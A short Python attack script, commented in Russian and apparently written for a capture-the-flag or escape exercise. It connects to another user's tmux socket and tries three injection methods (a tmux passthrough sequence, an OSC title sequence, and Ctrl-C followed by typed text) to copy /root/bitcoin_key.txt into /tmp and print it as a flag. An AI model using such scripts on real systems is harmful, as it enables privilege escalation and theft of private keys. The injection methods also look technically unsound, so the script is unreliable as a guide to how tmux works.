#!/usr/bin/env python3
import socket
import time
import os

# Простой метод - отправка команды напрямую
sock_path = '/tmp/tmux-100/default'

print("=== ПРЯМОЙ ЭСКЕЙП ===")

try:
    # Пробуем отправить команду без обёрток
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect(sock_path)

    # Отправляем прямую команду tmux
    raw_command = b'\x1bPtmux;\x1b\x1b[0mcat /root/bitcoin_key.txt > /tmp/bitcoin_direct.txt\x1b\\\n'
    sock.send(raw_command)
    sock.close()

    time.sleep(2)

    if os.path.exists('/tmp/bitcoin_direct.txt'):
        with open('/tmp/bitcoin_direct.txt', 'r') as f:
            print(f"ФЛАГ НАЙДЕН: {f.read().strip()}")
    else:
        print("Прямой метод не сработал")

except Exception as e:
    print(f"Ошибка прямого метода: {e}")

# Альтернативный метод - через escape sequence
try:
    print("Пробую escape sequence...")
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect(sock_path)

    # Отправляем команду через tmux escape
    sock.send(b'\x1b]0;cat /root/bitcoin_key.txt > /tmp/bitcoin_escape.txt\x07\n')
    sock.close()

    time.sleep(2)

    if os.path.exists('/tmp/bitcoin_escape.txt'):
        with open('/tmp/bitcoin_escape.txt', 'r') as f:
            print(f"ФЛАГ (escape): {f.read().strip()}")
    else:
        print("Escape метод не сработал")

except Exception as e:
    print(f"Ошибка escape метода: {e}")

# Попробуем через control sequence
try:
    print("Пробую control sequence...")
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect(sock_path)

    # Control-C + команда
    sock.send(b'\x03')  # Ctrl+C
    time.sleep(0.5)
    sock.send(b'cat /root/bitcoin_key.txt > /tmp/bitcoin_ctrl.txt\n')
    sock.close()

    time.sleep(2)

    if os.path.exists('/tmp/bitcoin_ctrl.txt'):
        with open('/tmp/bitcoin_ctrl.txt', 'r') as f:
            print(f"ФЛАГ (ctrl): {f.read().strip()}")
    else:
        print("Control метод не сработал")

except Exception as e:
    print(f"Ошибка control метода: {e}")